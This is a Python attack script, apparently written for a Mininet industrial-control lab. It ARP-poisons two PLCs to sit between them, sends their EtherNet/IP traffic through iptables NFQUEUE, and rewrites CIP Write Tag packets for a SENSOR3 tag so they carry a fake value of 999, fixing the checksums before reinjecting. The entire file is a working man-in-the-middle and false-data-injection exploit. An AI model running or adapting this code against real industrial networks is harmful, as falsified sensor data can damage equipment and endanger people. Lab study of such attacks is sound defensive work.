#!/usr/bin/env python3
"""
ARP Poisoning + ENIP False Data Injection (MitM)

How it works:
  1. Resolves real MAC addresses of plc1 and plc2 via ARP.
  2. Continuously sends poisoned ARP replies to both PLCs so their
     ARP caches map each other's IP to the attacker's MAC.
  3. Traffic between plc1 and plc2 now flows THROUGH the attacker.
  4. iptables sends forwarded ENIP (TCP/44818) packets to NFQUEUE.
  5. This script reads each packet, finds the CIP Write Tag payload
     for SENSOR3, replaces the real counter value with FAKE_VALUE,
     fixes checksums, and re-injects.

Run from Mininet CLI:
  mininet> attacker python3 attacker_mitm.py
"""

import os
import sys
import struct
import time
import threading
import signal

from scapy.all import (
    Ether, ARP, IP, TCP, Raw,
    sendp, srp1, get_if_hwaddr, get_if_list
)

PLC1_IP    = '10.0.0.1'
PLC2_IP    = '10.0.0.2'
ENIP_PORT  = 44818
FAKE_VALUE = 999

# CIP Write Tag Service packet header for SENSOR3 (INT type, 1 element)
# Byte layout:
#   0x4C        = Write Tag service code
#   0x05        = request path size (5 words = 10 bytes)
#   0x91 0x07   = ANSI extended symbolic segment, symbol length 7
#   "SENSOR3"   = 7-byte tag name
#   0x00        = pad byte (path must be word-aligned)
#   0xC3 0x00   = CIP data type INT (0x00C3)
#   0x01 0x00   = element count 1
# The next 2 bytes after this header are the INT value (little-endian).
SENSOR3_WRITE_HDR = (
    b'\x4c'
    b'\x05'
    b'\x91\x07SENSOR3\x00'
    b'\xc3\x00'
    b'\x01\x00'
)

_running = True


def get_iface():
    for iface in get_if_list():
        if iface != 'lo':
            return iface
    return 'eth0'


def get_mac(ip, iface):
    ans = srp1(
        Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=ip),
        iface=iface, timeout=3, verbose=False
    )
    return ans[ARP].hwsrc if ans else None


def arp_poison_loop(plc1_mac, plc2_mac, iface):
    our_mac = get_if_hwaddr(iface)
    print(f'[ARP] Spoofing: telling plc2 that {PLC1_IP} is at {our_mac}')
    print(f'[ARP] Spoofing: telling plc1 that {PLC2_IP} is at {our_mac}')
    while _running:
        # Poison plc2: "plc1's IP is at attacker's MAC"
        sendp(
            Ether(dst=plc2_mac) / ARP(
                op=2,
                pdst=PLC2_IP, hwdst=plc2_mac,
                psrc=PLC1_IP, hwsrc=our_mac),
            iface=iface, verbose=False
        )
        # Poison plc1: "plc2's IP is at attacker's MAC"
        sendp(
            Ether(dst=plc1_mac) / ARP(
                op=2,
                pdst=PLC1_IP, hwdst=plc1_mac,
                psrc=PLC2_IP, hwsrc=our_mac),
            iface=iface, verbose=False
        )
        time.sleep(0.5)


def modify_packet(pkt):
    """NFQueue callback: intercept SENSOR3 write, replace value with FAKE_VALUE."""
    data = IP(pkt.get_payload())

    if TCP not in data:
        pkt.accept()
        return

    raw = bytes(data[TCP].payload)
    idx = raw.find(SENSOR3_WRITE_HDR)

    if idx == -1:
        pkt.accept()
        return

    voff = idx + len(SENSOR3_WRITE_HDR)
    if voff + 2 > len(raw):
        pkt.accept()
        return

    real_value = struct.unpack_from('<h', raw, voff)[0]
    modified   = bytearray(raw)
    struct.pack_into('<h', modified, voff, FAKE_VALUE)

    data[TCP].payload = Raw(bytes(modified))
    del data[IP].chksum
    del data[TCP].chksum
    pkt.set_payload(bytes(data))

    print(f'[INJECT] SENSOR3 intercepted:  real={real_value}  →  injected={FAKE_VALUE}')
    pkt.accept()


def setup_iptables():
    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
    os.system(
        f'iptables -I FORWARD -p tcp --dport {ENIP_PORT} -j NFQUEUE --queue-num 0'
    )
    print(f'[iptables] NFQUEUE rule set for TCP port {ENIP_PORT}')


def teardown_iptables():
    os.system(
        f'iptables -D FORWARD -p tcp --dport {ENIP_PORT} -j NFQUEUE --queue-num 0'
    )
    print('[iptables] NFQUEUE rule removed')


def signal_handler(sig, frame):
    global _running
    _running = False
    teardown_iptables()
    print('\n[*] Attack stopped.')
    sys.exit(0)


if __name__ == '__main__':
    signal.signal(signal.SIGINT, signal_handler)

    iface = get_iface()
    print(f'[*] Interface: {iface}')

    print('[*] Resolving MAC addresses...')
    plc1_mac = get_mac(PLC1_IP, iface)
    plc2_mac = get_mac(PLC2_IP, iface)

    if not plc1_mac or not plc2_mac:
        print('[!] Could not resolve MACs — are PLCs running?')
        sys.exit(1)

    print(f'[*] plc1 MAC: {plc1_mac}')
    print(f'[*] plc2 MAC: {plc2_mac}')

    poison_thread = threading.Thread(
        target=arp_poison_loop,
        args=(plc1_mac, plc2_mac, iface),
        daemon=True
    )
    poison_thread.start()
    print('[*] ARP poisoning running — waiting 2s for caches to update...')
    time.sleep(2)

    try:
        from netfilterqueue import NetfilterQueue
    except ImportError:
        print('[!] netfilterqueue not installed.')
        print('    Run: sudo pip3 install netfilterqueue --break-system-packages')
        print('[*] ARP-poison-only mode active. Press Ctrl+C to stop.')
        while _running:
            time.sleep(1)
        sys.exit(0)

    setup_iptables()
    print(f'[*] Intercepting SENSOR3 writes — injecting {FAKE_VALUE} in place of real value')
    print('    Press Ctrl+C to stop.\n')

    nfq = NetfilterQueue()
    nfq.bind(0, modify_packet)
    try:
        nfq.run()
    except Exception as e:
        print(f'[!] NFQ error: {e}')
    finally:
        teardown_iptables()
